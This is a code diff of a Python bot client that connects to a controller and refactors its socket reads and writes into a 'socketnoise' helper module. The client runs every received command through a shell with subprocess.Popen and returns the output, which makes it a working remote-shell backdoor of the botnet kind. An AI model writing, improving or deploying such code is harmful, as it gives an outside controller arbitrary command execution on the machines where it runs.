@@ -1,6 +1,7 @@
 #! /usr/bin/env python3
 
-import modules, urllib.request, time, socket, subprocess, os
+import modules, urllib.request, time, socket, subprocess
+import modules.socketnoise as socketnoise
 
 
 botname = ''			# Put name of bot here
@@ -24,7 +25,7 @@ def connect():
 	print( "[CCCli] Controller accepted connection." )
 
 	while True: 
-		command = s.recv(1024).decode()
+		command = socketnoise.hear(s)
 
 		if '==terminate' in command:
 			try:
@@ -45,10 +46,9 @@ def connect():
 		else:
 			try:
 				CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-				s.send( CMD.stdout.read() ) 
-				s.send( CMD.stderr.read() )
+				socketnoise.respond(s, CMD.stdout.read() + CMD.stderr.read() ) 
 			except e:
-				s.send('[ERROR] {}'.format(e).encode())
+				socketnoise.respond(s, f'[ERROR] {e}')
 
 	return
 # ======================================================== #
